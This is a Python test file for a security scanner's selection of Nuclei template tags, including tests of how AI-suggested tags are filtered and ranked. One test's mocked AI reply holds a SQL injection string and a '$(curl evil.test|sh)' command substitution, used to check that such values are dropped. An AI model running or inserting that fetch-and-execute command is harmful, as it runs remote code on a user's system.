from unittest import mock

from django.test import TestCase
from django.utils import timezone

from cveFeed import nuclei_templates as nt
from dashboard.models import Org, Project
from scanEngine.models import EngineType
from startScan.models import ScanHistory, Subdomain, Technology
from targetApp.models import Domain


class StaticTagsTests(TestCase):
	def test_known_technology_names_map_to_tags(self):
		self.assertEqual(nt.static_tags_for(['WordPress', 'nginx']), {'wordpress', 'cms', 'nginx'})
		self.assertEqual(nt.static_tags_for(['Unknown Thing']), set())
		self.assertEqual(nt.static_tags_for([]), set())
		self.assertEqual(nt.static_tags_for([None, '']), set())


class AiTagsTests(TestCase):
	def test_ai_output_is_restricted_to_the_allowed_tag_list_even_if_it_hallucinates(self):
		provider = mock.Mock()
		provider.complete.return_value = '["jenkins", "DROP TABLE users;", "cms", "$(curl evil.test|sh)"]'
		tags = nt.ai_tags_for(['Some Unmapped Build System'], provider)
		self.assertEqual(tags, {'jenkins', 'cms'})  # only values from CANDIDATE_TAGS survive

	def test_ai_is_not_asked_about_names_the_static_table_already_covers(self):
		provider = mock.Mock()
		provider.complete.return_value = '["jenkins"]'
		nt.ai_tags_for(['nginx'], provider)  # nginx is already in STATIC_TAG_MAP
		provider.complete.assert_not_called()

	def test_no_provider_or_nothing_unmapped_returns_empty_without_calling_anything(self):
		self.assertEqual(nt.ai_tags_for(['Jenkins'], None), set())
		provider = mock.Mock()
		self.assertEqual(nt.ai_tags_for(['nginx'], provider), set())
		provider.complete.assert_not_called()

	def test_ai_errors_and_unparseable_replies_degrade_to_empty_not_a_crash(self):
		provider = mock.Mock()
		provider.complete.side_effect = RuntimeError('boom')
		self.assertEqual(nt.ai_tags_for(['Jenkins'], provider), set())
		provider2 = mock.Mock()
		provider2.complete.return_value = 'not json at all'
		self.assertEqual(nt.ai_tags_for(['Jenkins'], provider2), set())


class PertinentTagsTests(TestCase):
	"""Issue 208: the targeting prompt listed every installed tag (about 41,000 tokens), so a local model could not read it."""

	INSTALLED = {'nginx', 'php', 'wordpress', 'wp-plugin', 'wp-theme', 'apache', 'tomcat', 'apache-tomcat', 'jenkins', 'cms', 'tech', 'cve',
	             'exposure', 'iis', 'oracle', 'cisco', 'kubernetes'} | {f'cve{2000 + n % 25}-{n}' for n in range(5000)}

	def offered(self, *signatures, limit=nt.OFFER_MAX):
		return nt.pertinent_tags(list(signatures), self.INSTALLED, limit)

	def test_the_offer_is_the_tags_that_name_what_the_host_runs_and_the_generic_ones(self):
		out = self.offered(('nginx 1.18.0', 'wordpress'))
		for tag in ('nginx', 'wordpress', 'cms', 'exposure'):
			self.assertIn(tag, out)
		self.assertNotIn('cve', out)  # every CVE template on a host: the targeted CVE checks already run for the CVEs that matched
		self.assertNotIn('jenkins', out)
		self.assertNotIn('cisco', out)
		self.assertLess(len(out), 60)

	def test_a_tag_with_a_part_that_names_the_software_is_offered(self):
		out = self.offered(('Apache Tomcat 9.0',))
		self.assertIn('apache-tomcat', out)
		self.assertIn('tomcat', out)

	def test_a_version_number_is_not_a_word_to_match(self):
		self.assertNotIn('cve2000-0', self.offered(('nginx 2000',)))

	def test_the_offer_is_capped(self):
		many = {f'nginx-plugin-{n}' for n in range(2000)} | {'nginx'}
		out = nt.pertinent_tags([('nginx',)], many, 50)
		self.assertLessEqual(len(out), 50)
		self.assertIn('nginx', out)  # the exact name comes before the longer tags

	def test_the_prompt_lists_the_offer_and_the_answer_is_checked_against_every_installed_tag(self):
		seen = {}
		provider = mock.Mock()
		provider.complete.side_effect = lambda system, user: seen.update(system=system) or '{"0": {"tags": ["php", "nginx", "made-up"], "severities": ["high"]}}'
		offered = self.offered(('nginx 1.18.0',))
		self.assertNotIn('php', offered)
		out = nt.ai_plan([('nginx 1.18.0',)], provider, self.INSTALLED, offered=offered)
		self.assertNotIn('"php"', seen['system'])
		self.assertLess(len(seen['system']), 2500)  # not the 5,000 CVE tags
		self.assertEqual(out[0], ({'php', 'nginx'}, ('high',)))  # php was not offered but is installed: accepted; made-up is dropped

	def test_without_an_offer_the_whole_installed_list_is_listed_as_before(self):
		seen = {}
		provider = mock.Mock()
		provider.complete.side_effect = lambda system, user: seen.update(system=system) or '{}'
		nt.ai_plan([('nginx',)], provider, {'nginx', 'php'})
		self.assertIn('["nginx", "php"]', seen['system'])

	def test_planning_asks_with_the_offer(self):
		seen = {}
		provider = mock.Mock()
		provider.complete.side_effect = lambda system, user: seen.update(system=system) or '{}'
		profile = {'technologies': ['nginx'], 'services': [], 'exposure': [], 'cves': [], 'light': False}
		with mock.patch.object(nt, 'allowed_tags', return_value=set(self.INSTALLED)), mock.patch.object(nt, 'profile_names', return_value=['nginx 1.18.0']):
			nt.plan_targeting({'h.test': profile}, provider)
		self.assertLess(len(seen['system']), 2500)


class RankedOfferTests(TestCase):
	"""What a second look at issue 208 found: the offer is ranked, not cut alphabetically, and names that are run together or abbreviated
	meet the tags the templates use."""

	def test_a_late_alphabet_product_survives_a_crowd_of_early_tags(self):
		allowed = {f'apache-{n}' for n in range(600)} | {'apache', 'wordpress', 'zimbra', 'zimbra-admin', 'wp-plugin-zzz'}
		out = nt.pertinent_tags([('Apache httpd', 'WordPress', 'Zimbra')], allowed, 40)
		for tag in ('apache', 'wordpress', 'zimbra', 'zimbra-admin'):
			self.assertIn(tag, out)
		self.assertLessEqual(len(out), 40)

	def test_words_run_together_are_found(self):
		allowed = {'springboot', 'spring', 'paloalto', 'panos', 'globalprotect', 'bigip', 'f5'}
		self.assertIn('springboot', nt.pertinent_tags([('Spring Boot',)], allowed))
		self.assertIn('paloalto', nt.pertinent_tags([('Palo Alto',)], allowed))
		self.assertIn('panos', nt.pertinent_tags([('PAN-OS',)], allowed))

	def test_stop_words_name_no_product(self):
		allowed = {'web', 'http', 'server', 'manager', 'proxy', 'nginx'}
		out = nt.pertinent_tags([('Web Server', 'HTTP Proxy Manager', 'nginx')], allowed)
		self.assertEqual(out, ['nginx'])

	def test_the_best_tags_come_first(self):
		out = nt.pertinent_tags([('nginx',)], {'nginx', 'nginx-ui', 'exposure', 'misconfig'}, 10)
		self.assertEqual(out[0], 'nginx')
		self.assertLess(out.index('nginx-ui'), out.index('exposure'))

	def test_the_model_may_not_pick_the_whole_cve_set(self):
		provider = mock.Mock()
		provider.complete.return_value = '{"0": {"tags": ["cve", "nginx"], "severities": []}}'
		out = nt.ai_plan([('nginx',)], provider, {'cve', 'nginx'})
		self.assertEqual(out[0][0], {'nginx'})


class TemplateIndexTests(TestCase):
	"""The installed templates' own vendor, product and CPE metadata map a name to the tags that product's templates use."""

	def make(self, directory, name, tags, vendor='', product='', cpe=''):
		import os
		os.makedirs(directory, exist_ok=True)
		meta = ''.join(f'  {k}: {v}\n' for k, v in (('vendor', vendor), ('product', product)) if v)
		classification = f'  classification:\n    cpe: {cpe}\n' if cpe else ''
		with open(os.path.join(directory, name), 'w') as f:
			f.write(f'id: {name[:-5]}\ninfo:\n  name: x\n  severity: high\n{classification}  metadata:\n{meta}  tags: {tags}\n')

	def setUp(self):
		import tempfile
		self.dir = tempfile.mkdtemp()
		self.make(self.dir, 'a.yaml', 'cve,cve2024,panos,paloalto,globalprotect,rce', vendor='paloaltonetworks', product='pan-os')
		self.make(self.dir, 'b.yaml', 'cve,cve2023,panos,paloalto,kev', vendor='paloaltonetworks', product='pan-os')
		self.make(self.dir, 'c.yaml', 'cve,cve2021,apache,httpd,rce', cpe='cpe:2.3:a:apache:http_server:2.4.49:*:*:*:*:*:*:*')
		self.make(self.dir, 'd.yaml', 'tech,detect,springboot', product='spring_boot')
		nt._installed.pop(self.dir, None)
		self.addCleanup(nt._installed.pop, self.dir, None)

	def test_it_reads_tags_vendors_products_and_cpes(self):
		index = nt.installed_index(self.dir)
		self.assertIn('globalprotect', index.tags)
		self.assertIn('paloaltonetworks', index.products)
		self.assertIn('panos', index.products)
		self.assertIn('apache', index.products)  # from the CPE
		self.assertIn('httpserver', index.products)
		self.assertEqual(nt.installed_tags(self.dir), index.tags)

	def test_a_name_resolves_to_the_tags_that_products_templates_carry(self):
		index = nt.installed_index(self.dir)
		got = nt._index_tags(['Palo Alto Networks'], index)
		self.assertEqual(got, {'panos', 'paloalto'})  # not cve, kev, rce, or a year tag
		self.assertIn('panos', nt._index_tags(['PAN-OS'], index))
		self.assertIn('apache', nt._index_tags(['Apache HTTP Server'], index))
		self.assertIn('springboot', nt._index_tags(['Spring Boot'], index))
		self.assertEqual(nt._index_tags(['Web Server'], index), set())

	def test_the_offer_uses_it_and_ranks_it_above_a_partial_match(self):
		index = nt.installed_index(self.dir)
		allowed = set(index.tags) | {'pan-os-extra'}
		out = nt.pertinent_tags([('Palo Alto Networks', 'GlobalProtect')], allowed, index=index)
		self.assertIn('panos', out)
		self.assertIn('globalprotect', out)
		self.assertNotIn('cve', out)

	def test_without_templates_nothing_breaks(self):
		self.assertEqual(nt.installed_index('/no/such/dir').tags, frozenset())
		self.assertEqual(nt._index_tags(['nginx'], None), set())


class SelectTagsTests(TestCase):
	def setUp(self):
		org = Org.objects.create(name='T', slug='t-nuclei-tpl')
		self.project = Project.objects.create(name='P', slug='p-nuclei-tpl', insert_date=timezone.now(), org=org)
		self.domain = Domain.objects.create(name='example.test', project=self.project, insert_date=timezone.now())
		engine = EngineType.objects.create(engine_name='e', yaml_configuration='x')
		self.scan = ScanHistory.objects.create(domain=self.domain, scan_type=engine, start_scan_date=timezone.now())

	def test_no_subdomains_or_no_technology_gives_no_tags(self):
		self.assertEqual(nt.select_tags(self.scan), set())
		Subdomain.objects.create(scan_history=self.scan, name='www.example.test')
		self.assertEqual(nt.select_tags(self.scan), set())

	def test_fingerprinted_technology_maps_to_static_tags_with_ai_disabled(self):
		sub = Subdomain.objects.create(scan_history=self.scan, name='www.example.test')
		sub.technologies.add(Technology.objects.create(name='nginx'))
		with mock.patch('reNgine.ai_settings.get_configured_provider', return_value=None):
			self.assertEqual(nt.select_tags(self.scan), {'nginx'})

	def test_ai_augments_static_tags_when_configured(self):
		sub = Subdomain.objects.create(scan_history=self.scan, name='www.example.test')
		sub.technologies.add(Technology.objects.create(name='nginx'), Technology.objects.create(name='Grafana Labs Custom Build'))
		provider = mock.Mock()
		provider.complete.return_value = '["grafana"]'
		with mock.patch('reNgine.ai_settings.get_configured_provider', return_value=provider):
			self.assertEqual(nt.select_tags(self.scan), {'nginx', 'grafana'})
